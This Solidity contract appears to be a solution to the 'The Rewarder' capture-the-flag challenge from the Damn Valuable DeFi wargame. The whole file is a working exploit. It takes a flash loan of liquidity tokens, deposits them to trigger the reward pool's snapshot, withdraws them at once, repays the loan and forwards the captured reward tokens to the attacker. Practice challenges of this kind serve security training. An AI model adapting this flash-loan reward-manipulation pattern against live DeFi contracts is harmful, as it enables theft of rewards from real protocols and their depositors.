// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

contract RewarderAttack {
    FlashLoanerPool public flashLoanerPool;
    TheRewarderPool public rewarderPool;
    RewardToken public rewardToken;
    DamnValuableToken public liquidityToken;

    constructor(
        address flashLoanerPoolAddress,
        address rewarderPoolAddress,
        address rewardTokenAddress,
        address liquidityTokenAddress
    ) {
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function receiveFlashLoan(uint256 amount) public {
        // approve
        liquidityToken.approve(address(rewarderPool), amount);

        // deposit and trigger snapshot
        rewarderPool.deposit(amount);

        // withdraw/attack
        rewarderPool.withdraw(amount);

        // return the flash loan
        liquidityToken.transfer(msg.sender, amount);
    }

    function attack(uint256 amount) public {
        flashLoanerPool.flashLoan(amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
